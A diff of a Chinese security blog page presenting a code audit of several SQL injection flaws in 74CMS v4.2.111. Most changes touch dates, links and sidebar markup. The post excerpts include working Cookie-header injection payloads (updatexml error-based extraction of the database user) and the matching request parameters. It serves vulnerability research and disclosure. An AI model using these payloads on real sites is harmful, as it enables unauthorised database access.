@@ -79,12 +79,12 @@
 
 
 
-<meta name="description" content="title: 代码审计 | 74CMS_V4.2.111多处sql注入date: 2018-10-08 09:15:41tags: CMS   漏洞的大致思路: 1.找到think_filter()漏掉的表达式match 2.搜索用到where的参数可控的函数  a.get post cookie header等接收的参数  b.函数直接接收的参数 如  public function($id)">
+<meta name="description" content="title: 代码审计 | 74CMS_V4.2.111多处sql注入date: 2018-10-08 12:15:41 tags: CMS 漏洞的大致思路: 1.找到think_filter()漏掉的表达式match 2.搜索用到where的参数可控的函数  a.get post cookie header等接收的参数  b.函数直接接收的参数 如  public function($id)">
 <meta property="og:type" content="article">
 <meta property="og:title" content="P0rZ9&#39;s blog">
-<meta property="og:url" content="http://yoursite.com/2018/10/08/74CMS_V4.2.111多处sql注入/index.html">
+<meta property="og:url" content="http://yoursite.com/2018/10/10/74CMS_V4.2.111多处sql注入/index.html">
 <meta property="og:site_name" content="P0rZ9&#39;s blog">
-<meta property="og:description" content="title: 代码审计 | 74CMS_V4.2.111多处sql注入date: 2018-10-08 09:15:41tags: CMS   漏洞的大致思路: 1.找到think_filter()漏掉的表达式match 2.搜索用到where的参数可控的函数  a.get post cookie header等接收的参数  b.函数直接接收的参数 如  public function($id)">
+<meta property="og:description" content="title: 代码审计 | 74CMS_V4.2.111多处sql注入date: 2018-10-08 12:15:41 tags: CMS 漏洞的大致思路: 1.找到think_filter()漏掉的表达式match 2.搜索用到where的参数可控的函数  a.get post cookie header等接收的参数  b.函数直接接收的参数 如  public function($id)">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="http://static.zybuluo.com/chhyx/801cmnatics78bjp256lnu06/image_1cp969qp91hik13s31ua71t3a134e9.png">
 <meta property="og:image" content="http://static.zybuluo.com/chhyx/mpakzoyvfnp4eecpbsgem1hg/image_1cp96cpbe1fnq12uf1obr1sdt4dc1m.png">
@@ -101,10 +101,10 @@
 <meta property="og:image" content="http://static.zybuluo.com/chhyx/lxggkw9182tcrh3fb46vh5rb/image_1cp8u762a1mms1buc1l2bc851a4deg.png">
 <meta property="og:image" content="http://static.zybuluo.com/chhyx/02de6ocyv7r4dhob382abr8l/image_1cp8ufiq5u431rsd1p1a3j11sjjet.png">
 <meta property="og:image" content="http://static.zybuluo.com/chhyx/d2hpvua1m2jag632czdjhj3k/image_1cp903p10259b6p17d011omemhfa.png">
-<meta property="og:updated_time" content="2018-10-08T15:04:46.230Z">
+<meta property="og:updated_time" content="2018-10-10T06:08:29.432Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="P0rZ9&#39;s blog">
-<meta name="twitter:description" content="title: 代码审计 | 74CMS_V4.2.111多处sql注入date: 2018-10-08 09:15:41tags: CMS   漏洞的大致思路: 1.找到think_filter()漏掉的表达式match 2.搜索用到where的参数可控的函数  a.get post cookie header等接收的参数  b.函数直接接收的参数 如  public function($id)">
+<meta name="twitter:description" content="title: 代码审计 | 74CMS_V4.2.111多处sql注入date: 2018-10-08 12:15:41 tags: CMS 漏洞的大致思路: 1.找到think_filter()漏掉的表达式match 2.搜索用到where的参数可控的函数  a.get post cookie header等接收的参数  b.函数直接接收的参数 如  public function($id)">
 <meta name="twitter:image" content="http://static.zybuluo.com/chhyx/801cmnatics78bjp256lnu06/image_1cp969qp91hik13s31ua71t3a134e9.png">
 
 
@@ -135,7 +135,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/10/08/74CMS_V4.2.111多处sql注入/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/10/10/74CMS_V4.2.111多处sql注入/"/>
 
 
 
@@ -252,7 +252,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/08/74CMS_V4.2.111多处sql注入/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/10/74CMS_V4.2.111多处sql注入/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="P0rZ9">
@@ -281,8 +281,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-08T20:45:04+08:00">
-                2018-10-08
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-10T14:05:24+08:00">
+                2018-10-10
               </time>
             
 
@@ -325,17 +325,15 @@
 
       
         <hr>
-<p>title: 代码审计 | 74CMS_V4.2.111多处sql注入<br>date: 2018-10-08 09:15:41<br>tags: CMS</p>
-<hr>
-<hr>
+<p>title: 代码审计 | 74CMS_V4.2.111多处sql注入<br>date: 2018-10-08 12:15:41</p>
+<h2 id="tags-CMS"><a href="#tags-CMS" class="headerlink" title="tags: CMS"></a>tags: CMS</h2><hr>
 <p>漏洞的大致思路:</p>
 <pre><code>1.找到think_filter()漏掉的表达式match
 2.搜索用到where的参数可控的函数
  a.get post cookie header等接收的参数
  b.函数直接接收的参数 如  public function($id)
 3.用表达式构造sql语句
-</code></pre><hr>
-<p>##<strong>基础知识:</strong><br>总结一下在拿到一个基于TP框架开发的cms 审计流程是怎样的<br>这里以74cm最新版本<a href="http://www.74cms.com/download/load/id/534.html" target="_blank" rel="noopener">74cms_Home_Setup_v4.2.111</a>为例:<br>1.查看TP版本:</p>
+</code></pre><p>##<strong>基础知识:</strong><br>总结一下在拿到一个基于TP框架开发的cms 审计流程是怎样的<br>这里以74cm最新版本<a href="http://www.74cms.com/download/load/id/534.html" target="_blank" rel="noopener">74cms_Home_Setup_v4.2.111</a>为例:<br>1.查看TP版本:</p>
 <pre><code>#upload\ThinkPHP\ThinkPHP.php
 </code></pre><p><img src="http://static.zybuluo.com/chhyx/801cmnatics78bjp256lnu06/image_1cp969qp91hik13s31ua71t3a134e9.png" alt="image_1cp969qp91hik13s31ua71t3a134e9.png-23.6kB"><br>2.查看系统参数过滤情况:</p>
 <pre><code>#upload\applicaton\common\conf\config.php
@@ -442,7 +440,7 @@ POST：ucenter=bind&amp;utype=2&amp;reg_type=1&amp;unbind_mobile=1 //满足bcd
 headers:Content-Type: application/x-www-form-urlencoded
         X-Requested-With: XMLHttpRequest         //满足AJAX操作
 
-Cookie: members_uc_info[mobile][0]=match; members_uc_info[mobile][16][0]=aa&quot;) and updatexml(1,concat(0x7e,(select user())),0) -- a //注入利用
+Cookie: members_uc_info[mobile][0]=match; members_uc_info[mobile][1][0]=aa&quot;) and updatexml(1,concat(0x7e,(select user())),0) -- a //注入利用
 </code></pre><p><img src="http://static.zybuluo.com/chhyx/lxggkw9182tcrh3fb46vh5rb/image_1cp8u762a1mms1buc1l2bc851a4deg.png" alt="image_1cp8u762a1mms1buc1l2bc851a4deg.png-93.2kB"></p>
 <p>本地测试时,如无短信服务,我们可以注释掉对验证码的判断来完成漏洞利用<br><img src="http://static.zybuluo.com/chhyx/02de6ocyv7r4dhob382abr8l/image_1cp8ufiq5u431rsd1p1a3j11sjjet.png" alt="image_1cp8ufiq5u431rsd1p1a3j11sjjet.png-75.4kB"></p>
 <p>4.<code>upload\Application\Home\Controller\membercontroller.class.php</code></p>
@@ -472,7 +470,7 @@ Cookie: members_uc_info[mobile][0]=match; members_uc_info[mobile][16][0]=aa&quot
 <pre><code>header：Content-Type: application/x-www-form-urlencoded
        //表明提交的表单数据编码为键值对,用&amp;分隔
 
-Cookie: members_bind_info[type][0]=match; members_bind_info[type][19][0]=aa&quot;) and updatexml(1,concat(0x7e,(select user())),0) -- a
+Cookie: members_bind_info[type][0]=match; members_bind_info[type][1][0]=aa&quot;) and updatexml(1,concat(0x7e,(select user())),0) -- a
 
 POST: username=test1&amp;password=test1  //注册账户 用户名:test1       密码:test1
 </code></pre><p>这里的<code>$user_bind_info</code>是用<code>cookie</code>方式直接传过来的 我们可控导致注入产生:<br><img src="http://static.zybuluo.com/chhyx/d2hpvua1m2jag632czdjhj3k/image_1cp903p10259b6p17d011omemhfa.png" alt="image_1cp903p10259b6p17d011omemhfa.png-92.9kB"></p>
@@ -500,8 +498,8 @@ POST: username=test1&amp;password=test1  //注册账户 用户名:test1       �
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/10/02/74CMS缓存设计缺陷导致getshell/" rel="next" title="代码审计 | 74CMS缓存设计缺陷导致getshell">
-                <i class="fa fa-chevron-left"></i> 代码审计 | 74CMS缓存设计缺陷导致getshell
+              <a href="/2018/10/10/74CMS_V4.2.111任意文件读取到任意密码重置/" rel="next" title="代码审计 | 74CMS_V4.2.111任意文件读取到任意密码重置">
+                <i class="fa fa-chevron-left"></i> 代码审计 | 74CMS_V4.2.111任意文件读取到任意密码重置
               </a>
             
           </div>
@@ -509,10 +507,6 @@ POST: username=test1&amp;password=test1  //注册账户 用户名:test1       �
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/10/09/74CMS_V4.2.111一处任意文件读取附py脚本/" rel="prev" title="代码审计 | 74CMS_V4.2.111一处任意文件读取附py脚本">
-                代码审计 | 74CMS_V4.2.111一处任意文件读取附py脚本 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -564,8 +558,17 @@ POST: username=test1&amp;password=test1  //注册账户 用户名:test1       �
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -580,7 +583,7 @@ POST: username=test1&amp;password=test1  //注册账户 用户名:test1       �
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-count">24</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -616,6 +619,22 @@ POST: username=test1&amp;password=test1  //注册账户 用户名:test1       �
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#tags-CMS"><span class="nav-number">1.</span> <span class="nav-text">tags: CMS</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
